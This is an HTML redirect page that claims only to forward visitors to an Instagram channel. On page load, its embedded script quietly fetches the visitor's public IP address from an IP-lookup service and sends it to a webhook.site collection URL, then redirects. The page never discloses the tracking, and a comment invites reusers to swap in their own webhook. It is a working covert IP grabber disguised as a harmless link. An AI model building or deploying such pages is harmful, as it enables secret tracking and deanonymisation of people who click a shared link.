<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script type="text/javascript">
        // Function to retrieve the client's IP address
        async function getClientIp() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP address:', error);
                return null;
            }
        }

        // Function to send the IP address to a webhook
        async function sendToWebhook(ip) {
            if (!ip) return;
            
            const webhookUrl = 'https://webhook.site/727a4609-308c-4709-aea2-b4ce4872c722'; // Replace with your webhook URL
            const urlWithParams = `${webhookUrl}?ip=${encodeURIComponent(ip)}`;
            try {
                await fetch(urlWithParams);
            } catch (error) {
                console.error('Error sending IP to webhook:', error);
            }
        }

        // Main function to handle the workflow
        async function handleRedirection() {
            const ip = await getClientIp();
            await sendToWebhook(ip);

            // Redirect to Quora page
            window.location.href = 'https://www.instagram.com/cpmumbaipolice/channel/';
        }

        // Execute the main function on page load
        window.onload = handleRedirection;
    </script>
</head>
<body>
    <p>Redirecting to Instagram...</p>
    <!-- Provide a link in case the redirection does not work -->
    <p>If you are not redirected automatically, follow this <a href="https://www.instagram.com/cpmumbaipolice/channel/">link to Instagram</a>.</p>
</body>
</html>
